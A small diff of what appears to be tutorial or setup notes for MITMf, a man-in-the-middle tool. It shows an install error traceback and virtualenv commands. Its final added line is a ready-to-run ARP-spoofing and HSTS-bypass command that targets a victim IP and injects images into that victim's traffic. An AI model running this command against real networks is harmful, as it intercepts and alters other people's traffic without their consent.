@@ -25,6 +25,7 @@
   
   <li>python mitmf.py --help</li>
   
+  </ol>
   
   #ERROR
   Traceback (most recent call last):
@@ -39,4 +40,4 @@ ImportError: No module named pyinotify
   !mkvirtualenv MITMf -p /usr/bin/python2.7
   !RUN python mitmf.py --help
                  
-</ol>
+python mitmf.py -i wlan0 --spoof --arp --hsts --gateway <ip-router> --target <ip-victim> --imgrand --img-dir <Directory with images> /root/img/
